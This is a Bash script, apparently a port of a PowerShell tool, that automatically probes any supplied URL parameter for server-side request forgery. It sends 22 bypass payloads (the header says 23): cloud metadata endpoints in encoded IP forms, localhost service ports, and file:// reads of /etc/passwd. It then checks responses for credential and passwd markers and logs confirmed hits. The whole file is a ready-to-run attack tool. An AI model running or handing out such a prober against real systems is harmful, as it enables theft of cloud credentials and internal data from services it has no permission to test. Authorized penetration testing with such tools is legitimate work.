#!/bin/bash
# ==============================================================================
# 🧭 Automated SSRF Payload & Mutation Prober (Bash port of test_ssrf_bypasses.ps1)
# Tests an injection endpoint against 23 modern SSRF bypass encodings:
# Decimal/Hex/Octal IPs, IPv6 mapping, cloud metadata, protocol alternatives.
# ==============================================================================

TARGET_URL="${1:-}"
OUTPUT_DIR="${2:-recon_output}"
TIMEOUT_SEC="${3:-8}"

if [ -z "$TARGET_URL" ]; then
    echo "Usage: ./scripts/test_ssrf_bypasses.sh <target_url> [output_dir] [timeout_sec]"
    echo "Example: ./scripts/test_ssrf_bypasses.sh 'https://target.com/api/preview?url=FUZZ'"
    exit 1
fi

CYAN='\033[0;36m'; GREEN='\033[0;32m'; RED='\033[0;31m'; YELLOW='\033[1;33m'; GRAY='\033[0;90m'; NC='\033[0m'
echo -e "\n${CYAN}[+] ==================================================${NC}"
echo -e "${CYAN}[+] Automated SSRF & Cloud Metadata Prober${NC}"
echo -e "${CYAN}[+] Target Endpoint: $TARGET_URL${NC}"
echo -e "${CYAN}[+] ==================================================${NC}\n"

mkdir -p "$OUTPUT_DIR"
REPORT_FILE="$OUTPUT_DIR/ssrf_probe_results.jsonl"
: > "$REPORT_FILE"

UA="Mozilla/5.0 SSRF-Auditor"

# Ensure FUZZ placeholder exists
if [[ "$TARGET_URL" != *"FUZZ"* ]]; then
    if [[ "$TARGET_URL" == *"?"* ]]; then
        TARGET_URL="$TARGET_URL&url=FUZZ"
    else
        TARGET_URL="$TARGET_URL?url=FUZZ"
    fi
    echo -e "${YELLOW}[*] Appended default parameter. New target: $TARGET_URL${NC}"
fi

urlencode() { python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1], safe=''))" "$1" 2>/dev/null \
    || jq -rn --arg s "$1" '$s|@uri'; }

# 23 High-Signal SSRF Payloads: Name|Payload
PAYLOADS=(
    "AWS IMDSv1 Plain|http://169.254.169.254/latest/meta-data/"
    "AWS IMDS Decimal IP|http://2852039166/latest/meta-data/"
    "AWS IMDS Hex IP|http://0xa9fea9fe/latest/meta-data/"
    "AWS IMDS Octal IP|http://0251.0376.0251.0376/latest/meta-data/"
    "AWS IMDS IPv6 Mapped|http://[::ffff:169.254.169.254]/latest/meta-data/"
    "AWS IMDS DNS Wildcard|http://169.254.169.254.nip.io/latest/meta-data/"
    "GCP Internal Metadata|http://metadata.google.internal/computeMetadata/v1/"
    "Azure Instance Metadata|http://169.254.169.254/metadata/instance?api-version=2021-02-01"
    "Localhost IPv4 Standard|http://127.0.0.1/"
    "Localhost Decimal IP|http://2130706433/"
    "Localhost Hex IP|http://0x7f000001/"
    "Localhost Octal IP|http://0177.0.0.1/"
    "Localhost Shortened|http://127.1/"
    "Localhost Zero IP|http://0/"
    "Localhost IPv6|http://[::1]/"
    "Localhost DNS Wildcard|http://127.0.0.1.nip.io/"
    "Localhost Alternate Port 8080|http://127.0.0.1:8080/"
    "Localhost Elastic Port 9200|http://127.0.0.1:9200/_cat/indices"
    "Localhost Redis Port 6379|http://127.0.0.1:6379/"
    "File Protocol /etc/passwd|file:///etc/passwd"
    "File Protocol win.ini|file:///c:/windows/win.ini"
    "Dict Protocol Memcached|dict://127.0.0.1:11211/stat"
)

INDICATORS=("ami-id" "instance-id" "security-credentials" "root:x:0:0" "[extensions]" "redis_version" "computeMetadata")

# Baseline measurement
echo -e "${YELLOW}[*] Capturing baseline response with dummy external host...${NC}"
BASELINE_URL="${TARGET_URL/FUZZ/$(urlencode "https://example.com")}"
BASELINE_LEN=0
BASE_OUT=$(curl -sk --max-time "$TIMEOUT_SEC" -A "$UA" -o /dev/null -w "%{http_code} %{size_download}" "$BASELINE_URL" 2>/dev/null)
if [ -n "$BASE_OUT" ]; then
    BASELINE_LEN="${BASE_OUT##* }"
    echo -e "${GRAY}[+] Baseline captured: HTTP ${BASE_OUT%% *} ($BASELINE_LEN bytes)${NC}\n"
else
    echo -e "${GRAY}[!] Baseline request failed. Continuing with relative checks.${NC}\n"
fi

VULNS_FOUND=0

for entry in "${PAYLOADS[@]}"; do
    P_NAME="${entry%%|*}"
    RAW_PAYLOAD="${entry#*|}"
    ENCODED=$(urlencode "$RAW_PAYLOAD")
    TEST_URL="${TARGET_URL/FUZZ/$ENCODED}"

    printf "  -> Probing [%s]... " "$P_NAME"

    BODY=$(curl -sk --max-time "$TIMEOUT_SEC" -A "$UA" -w "\n%{http_code} %{size_download}" "$TEST_URL" 2>/dev/null)
    if [ -z "$BODY" ]; then
        echo -e "${GRAY}[Connection Blocked/Timed Out]${NC}"
        continue
    fi
    META="${BODY##*$'\n'}"
    STATUS="${META%% *}"
    LEN="${META##* }"
    BODY="${BODY%$'\n'*}"

    FOUND_INDICATOR=""
    for ind in "${INDICATORS[@]}"; do
        if [[ "$BODY" == *"$ind"* ]]; then
            FOUND_INDICATOR="$ind"
            break
        fi
    done

    TS=$(date '+%Y-%m-%d %H:%M:%S')
    if [ -n "$FOUND_INDICATOR" ]; then
        echo -e "${RED}[CONFIRMED VULNERABLE: Matched '$FOUND_INDICATOR'] (HTTP $STATUS, $LEN bytes)${NC}"
        VULNS_FOUND=$((VULNS_FOUND+1))
        jq -n -c --arg name "$P_NAME" --arg payload "$RAW_PAYLOAD" --arg status "$STATUS" --arg len "$LEN" \
           --arg evidence "$FOUND_INDICATOR" --arg ts "$TS" \
           '{TestName:$name, Payload:$payload, Status:($status|tonumber), Length:($len|tonumber),
             Confidence:"HIGH_CONFIRMED", Evidence:$evidence, Timestamp:$ts}' >> "$REPORT_FILE"
    elif [ "$LEN" != "$BASELINE_LEN" ] && [ "$LEN" -gt 0 ] 2>/dev/null; then
        echo -e "${YELLOW}[ANOMALY DETECTED] (HTTP $STATUS, $LEN bytes vs baseline $BASELINE_LEN)${NC}"
        jq -n -c --arg name "$P_NAME" --arg payload "$RAW_PAYLOAD" --arg status "$STATUS" --arg len "$LEN" \
           --arg ts "$TS" \
           '{TestName:$name, Payload:$payload, Status:($status|tonumber), Length:($len|tonumber),
             Confidence:"ANOMALY_DIFF", Evidence:"Response length difference", Timestamp:$ts}' >> "$REPORT_FILE"
    else
        echo -e "${GRAY}[HTTP $STATUS: $LEN bytes]${NC}"
    fi
done

echo -e "\n${GREEN}[+] SSRF Probing Completed!${NC}"
if [ "$VULNS_FOUND" -gt 0 ]; then
    echo -e "${RED}[+] Confirmed Vulnerabilities: $VULNS_FOUND${NC}"
else
    echo -e "${GREEN}[+] Confirmed Vulnerabilities: 0${NC}"
fi
echo -e "[!] Detailed results saved in: $REPORT_FILE"
